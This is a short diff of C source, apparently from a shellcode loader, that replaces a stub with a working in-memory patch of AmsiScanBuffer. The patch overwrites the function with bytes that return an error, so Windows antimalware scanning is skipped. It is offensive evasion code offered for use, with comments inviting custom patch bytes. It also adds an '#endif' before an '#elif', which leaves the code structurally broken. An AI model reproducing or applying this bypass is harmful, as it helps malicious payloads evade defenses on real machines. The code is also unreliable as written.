@@ -33,11 +33,38 @@
 
 
 #if defined(BYPASS_AMSI_A)
-// This is where you may define your own AMSI bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
+// Custom AMSI bypass
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  return TRUE;
+    HMODULE dll;
+    LPVOID cs;
+    DWORD op, t;
+    
+    // Patch bytes: mov eax, 0x80070057 ; ret
+    // This makes AmsiScanBuffer return "invalid parameter" instead of scanning
+    // Replace this with your own custom patch bytes
+    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    
+    // Try to get a handle to amsi.dll
+    dll = xGetLibAddress(inst, inst->amsi);
+    if(dll == NULL) return TRUE;  // AMSI not present, nothing to do
+    
+    // Get address of AmsiScanBuffer
+    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
+    if(cs == NULL) return FALSE;  // Should exist, fail if not found
+    
+    // Make the memory writable
+    if(!inst->api.VirtualProtect(cs, sizeof(patch), PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+    
+    // Copy our patch over the real function
+    Memcpy(cs, patch, sizeof(patch));
+    
+    // Restore original memory protection
+    inst->api.VirtualProtect(cs, sizeof(patch), op, &t);
+    
+    return TRUE;
 }
+#endif
 
 #elif defined(BYPASS_AMSI_B)
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
